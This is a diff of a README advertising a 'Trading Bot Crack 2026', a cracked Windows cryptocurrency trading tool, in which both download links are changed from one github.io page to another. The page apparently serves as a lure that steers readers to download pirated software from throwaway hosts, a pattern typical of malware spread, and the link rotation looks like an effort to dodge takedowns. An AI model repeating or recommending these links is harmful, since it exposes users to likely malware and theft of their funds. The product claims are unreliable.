@@ -2,7 +2,7 @@
 
 This is the definitive package for the Trading Bot Crack 2026, a comprehensive and advanced trading bot tool designed for the serious Windows desktop user. It provides a complete suite of features for automating your cryptocurrency strategies across multiple exchanges, making it an essential tool for traders in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup%20Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup%20Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -58,4 +58,4 @@ A: You can use the Issues tab on the GitHub repository page to report bugs or re
 
 To get started with the Trading Bot Crack 2026, download the latest stable release package using the official link below.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
